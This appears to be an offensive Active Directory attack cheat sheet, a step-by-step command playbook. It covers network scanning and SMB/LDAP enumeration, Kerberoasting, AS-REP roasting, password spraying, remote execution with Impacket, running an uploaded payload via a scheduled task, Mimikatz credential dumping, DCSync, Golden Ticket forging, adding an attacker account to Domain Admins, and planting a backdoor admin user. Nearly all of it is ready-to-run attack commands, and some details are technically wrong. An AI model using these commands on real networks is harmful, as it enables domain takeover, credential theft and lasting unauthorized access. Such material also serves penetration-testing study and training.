
## 1. Initial Network Reconnaissance

1. **Identify live hosts and open ports**

   * Scan the target network (or single host) to find Windows machines and AD services.
   * Example: scan common AD-related ports (88/Kerberos, 135/RPC, 139/SMB, 389/LDAP, 445/SMB, 464/kerberos-password, 636/LDAPS, 3268/GlobalCatalog).

     ```bash
     # Full TCP port scan + service/version detection (-sV) on suspected host
     nmap -p 88,135,139,389,445,464,636,3268 -sV -Pn 10.10.10.5
     ```
   * Or, discover all live hosts in a subnet, then focus AD ports:

     ```bash
     # Discover live IPs
     nmap -sn 10.10.10.0/24

     # Scan AD ports for all live IPs
     nmap -p 88,135,139,389,445,464,636,3268 -sV -Pn 10.10.10.0/24
     ```

2. **OS and service fingerprinting**

   * Determine if the host is running Windows (e.g., Windows Server 2016/2019) and skim versions of SMB, LDAP, etc.

     ```bash
     nmap -O -sV -p 445,135,389,88 10.10.10.5
     ```

3. **Identify domain name / NetBIOS name**

   * Use `nbtscan` or Nmap’s SMB scripts to enumerate the NetBIOS or DNS domain:

     ```bash
     # NetBIOS name enumeration
     nbtscan 10.10.10.0/24

     # Nmap script for NetBIOS
     nmap -p 137 --script nbstat.nse 10.10.10.5
     ```

---

## 2. SMB & Share Enumeration

1. **Anonymous SMB share enumeration**

   * Check if shares allow anonymous access or if null sessions are permitted.

     ```bash
     smbclient -L \\10.10.10.5 -N
     ```
   * If credentials needed, replace `-N` with `-U 'DOMAIN\user%pass'`.

2. **enum4linux enumeration**

   * Comprehensive Linux-based enumeration (user lists, share lists, password policy).

     ```bash
     enum4linux -a 10.10.10.5
     ```
   * Look for:

     * `DOMAIN\username` list
     * Password policy details (min length, complexity)
     * Shares with READ/WRITE permissions
     * Domain controller information

3. **SMB enumeration with CrackMapExec**

   * Quickly enumerate SMB info, OS details, and share access (requires a “null” or valid credential).

     ```bash
     # Null session check
     crackmapexec smb 10.10.10.5 -u '' -p ''
     # Enumerate users/shares with known creds
     crackmapexec smb 10.10.10.5 -u 'administrator' -p 'Password123'
     ```

4. **RPC enumeration via rpcclient**

   * Enumerate domain users, groups, and shares via RPC.

     ```bash
     # Null session
     rpcclient -U "" -N 10.10.10.5
     # Once in rpcclient shell:
     enumdomusers
     enumalsgroups
     enumdomgroups
     # To enumerate shares:
     srvinfo 10.10.10.5
     netshareenum
     ```

---

## 3. LDAP / Active Directory Enumeration

1. **Anonymous or simple-bind LDAP enumeration**

   * If LDAP allows anonymous binds, pull user and group info.

     ```bash
     # ldapsearch with anonymous bind
     ldapsearch -x -h 10.10.10.5 -s sub -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName displayName
     ```
   * If a simple-bind credential is found:

     ```bash
     ldapsearch -D "CORP\username" -w 'Passw0rd!' -h 10.10.10.5 -b "DC=corp,DC=local" "(objectClass=computer)" dNSHostName
     ```

2. **crackmapexec’s LDAP module**

   * Quickly enumerate users, computers, groups.

     ```bash
     crackmapexec ldap 10.10.10.5 -u 'user' -p 'Passw0rd!'
     ```
   * Output will show domain SID, domain name, discovered users/computers.

3. **BloodHound data collection**

   * If you have a low-privileged domain account, run the SharpHound ingestor to collect relationships.

     ```powershell
     # On Windows host (PowerShell)
     Import-Module .\SharpHound.ps1
     Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName data.zip
     ```
   * Transfer `data.zip` to Kali and analyze in BloodHound.

---

## 4. Kerberos & Kerberoasting Attacks

1. **Check for Kerberos (port 88)**

   * Ensure that the target’s Kerberos service is reachable:

     ```bash
     nc -vz 10.10.10.5 88
     ```

2. **User enumeration via Kerberos pre-auth failure messages**

   * Try to authenticate with non-existent and existing users to see which respond differently.

     ```bash
     # Use Kerbrute to enumerate valid usernames
     kerbrute userenum --dc 10.10.10.5 -d CORP.LOCAL usernames.txt
     ```

3. **Kerberoasting – request TGS tickets for service accounts**

   * Use Impacket’s `GetUserSPNs.py` to request service tickets for accounts with SPNs.

     ```bash
     GetUserSPNs.py CORP.LOCAL/username:Passw0rd! -dc-ip 10.10.10.5 -request
     ```
   * Output: one or more `.ccache` files containing TGS hashes. Crack them offline with Hashcat or John:

     ```bash
     # Example Hashcat command
     hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
     ```

---

## 5. Password Spraying & Brute-Forcing

1. **Password spraying with CrackMapExec**

   * Try a common password (e.g., “Summer2025!”) across a large user list to avoid lockouts.

     ```bash
     crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Summer2025!'
     ```

2. **Hydra/CrackMapExec for SMB brute-forcing (if allowed)**

   * Use smaller user lists and password lists to avoid lockouts.

     ```bash
     # Hydra example
     hydra -L users.txt -P passwords.txt smb://10.10.10.5
     ```

3. **AS-REP Roasting**

   * Identify users without “PreAuthRequired” set and request AS-REP to get their encrypted TGTs.

     ```bash
     GetNPUsers.py CORP.LOCAL/ -dc-ip 10.10.10.5 -usersfile users_no_preauth.txt -format john
     ```
   * Crack the resulting hashes offline:

     ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
     ```

---

## 6. SMB / RPC Authentication and Lateral Movement

1. **Try valid credentials on SMB to list shares/access RDP**

   * If you’ve cracked a password (e.g., `svc_backup:Password1`):

     ```bash
     crackmapexec smb 10.10.10.5 -u 'svc_backup' -p 'Password1' --shares
     ```
   * Mount an accessible share:

     ```bash
     mkdir /mnt/backup && mount -t cifs //10.10.10.5/Backup$ /mnt/backup -o username=svc_backup,password=Password1,domain=CORP
     ```

2. **WMIC/RPC execution**

   * Use Impacket’s `wmiexec.py` or `psexec.py` to run commands on the remote host:

     ```bash
     # WMI Exec
     wmiexec.py CORP.LOCAL/svc_backup:Password1@10.10.10.5

     # SMBExec (if services permit)
     smbexec.py CORP.LOCAL/svc_backup:Password1@10.10.10.5
     ```

3. **SMB file upload and scheduled task (if psexec fails)**

   * Upload a payload (e.g., Cobalt Strike, custom exe) to a writable share, then run via `schtasks`.

     ```bash
     # Upload using smbclient
     smbclient //10.10.10.5/Temp$ -U "svc_backup%Password1"
     put local_payload.exe

     # On local Kali, schedule via RPC
     rpcclient -U "svc_backup%Password1" 10.10.10.5
     >schtasks /Create /S 10.10.10.5 /RU "CORP\svc_backup" /RP "Password1" /SC ONCE /ST 12:00 /TN "Updater" /TR "C:\Temp\local_payload.exe"
     ```

---

## 7. Local Privilege Escalation on Windows Hosts

Once you get a foothold (low-privileged user or SYSTEM), escalate privileges:

1. **Identify patch level / missing patches**

   * Check OS version and patch level (e.g., Windows Server 2016 unpatched of certain CVEs).

     ```powershell
     # On remote host via WMI
     systeminfo
     ```

2. **Check for vulnerable services or misconfigurations**

   * Look for services running as `NT AUTHORITY\SYSTEM` with weak file permissions.

     ```powershell
     # On remote shell
     whoami /priv
     winPEAS.bat  # if you can upload winPEAS for automated checks
     ```

3. **Exploit known local LPEs**

   * Examples: PrintNightmare (CVE-2021-1675, if unpatched), PetitPotam/NTLM Relay, JuicyPotato/DfsCoerce for NT AUTHORITY\SYSTEM.
   * If you find an unquoted service path:

     ```powershell
     # On remote:
     sc qc VulnerableService
     # If unquoted path, place malicious EXE at c:\Program Files\Malware\Malicious.exe
     ```

4. **Dump local hashes or extract credentials (Mimikatz)**

   * Once SYSTEM, run Mimikatz to extract plaintext creds or Kerberos tickets.

     ```powershell
     mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
     ```

---

## 8. Domain Privilege Escalation & DCSync

1. **Identify if you have Domain Replication privileges**

   * If you have a user in “Replicator” or certain groups (e.g., DCSync allows `replication-get`), perform DCSync.

     ```bash
     # Impacket’s secretsdump DCSync
     secretsdump.py CORP.LOCAL/replicator:Passw0rd!@10.10.10.5 -just-dc-cred
     ```
   * This dumps all domain hashes (including `krbtgt`).

2. **Kerberos ticket forging / Overpass-the-Hash**

   * If you have NTLM hashes of a high-privileged user (e.g., `krbtgt`), forge Golden Tickets with Mimikatz or Rubeus.

     ```powershell
     # On a Windows box with Mimikatz:
     kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-XXXXX /krbtgt:HASH /id:500 /ptt
     ```

3. **LDAP modifications to escalate privileges**

   * If you have permissions to modify group memberships, add yourself to `Domain Admins`.

     ```bash
     # Using ldapmodify (example LDIF file add-member.ldif):
     ldapmodify -x -D "CN=svc_ldap,CN=Users,DC=corp,DC=local" -w Passw0rd! -f add-member.ldif
     ```

     ```ldif
     dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
     changetype: modify
     add: member
     member: CN=attacker,OU=Users,DC=corp,DC=local
     ```

4. **Verify Domain Admin membership**

   * Once added, verify with `whoami /groups` or via `Get-ADGroupMember` on a Windows session:

     ```powershell
     whoami /groups | findstr "Domain Admins"
     ```

---

## 9. Post-Exploitation Enumeration & Persistence

1. **Enumerate all Domain Controllers and critical servers**

   * Get list of all DCs (via `nltest` or AD enumeration).

     ```powershell
     nltest /dclist:corp.local
     ```
   * Map out site topology (if needed).

2. **Establish persistence**

   * Create a new domain user with high privileges or create a Golden Ticket backdoor.

     ```powershell
     # Create new user via PowerShell (requires Domain Admin)
     New-ADUser -Name "svc_persistence" -SamAccountName "svc_persistence" -AccountPassword (ConvertTo-SecureString "P@ssw0rd1!" -AsPlainText -Force) -Enabled $true
     Add-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence"
     ```

3. **Dump credentials and tickets for future use**

   * Export Kerberos TGT/ TGS tickets:

     ```powershell
     klist purge
     klist get krbtgt
     ```

4. **Enable Remote Services (RDP, WinRM) for later access**

   * If RDP/WinRM disabled, use `Set-Item` in registry or `Enable-PSRemoting`.

     ```powershell
     # Enable RDP
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

     # Enable WinRM
     Enable-PSRemoting -Force
     ```

### Sample Command Summary

> The following is a quick reference of key commands (replace placeholders appropriately).

```bash
# 1. Nmap reconnaissance
nmap -p 88,135,139,389,445,464,636,3268 -sV -Pn 10.10.10.5

# 2. enum4linux
enum4linux -a 10.10.10.5

# 3. smbclient null session
smbclient -L \\10.10.10.5 -N

# 4. rpcclient user enumeration
rpcclient -U "" -N 10.10.10.5
> enumdomusers

# 5. CrackMapExec credential check
crackmapexec smb 10.10.10.5 -u 'svc_user' -p 'Passw0rd!'

# 6. LDAP enumeration (anonymous)
ldapsearch -x -h 10.10.10.5 -s sub -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# 7. Kerberoasting (Impacket)
GetUserSPNs.py CORP.LOCAL/username:Passw0rd! -dc-ip 10.10.10.5 -request

# 8. AS-REP roasting
GetNPUsers.py CORP.LOCAL/ -dc-ip 10.10.10.5 -usersfile users_no_preauth.txt -format john

# 9. SMB execution
wmiexec.py CORP.LOCAL/svc_exec:Passw0rd!@10.10.10.5

# 10. Local privilege escalation check (winPEAS)
# Upload winPEAS.bat, then on remote:
.\winPEAS.bat

# 11. DCSync with secretsdump
secretsdump.py CORP.LOCAL/replicator:Passw0rd!@10.10.10.5 -just-dc-cred

# 12. Create persistent user (PowerShell)
New-ADUser -Name "svc_persistence" -SamAccountName "svc_persistence" -AccountPassword (ConvertTo-SecureString "P@ssw0rd1!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence"

# 13. Mimikatz dump
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Credits : n0rmh3ll
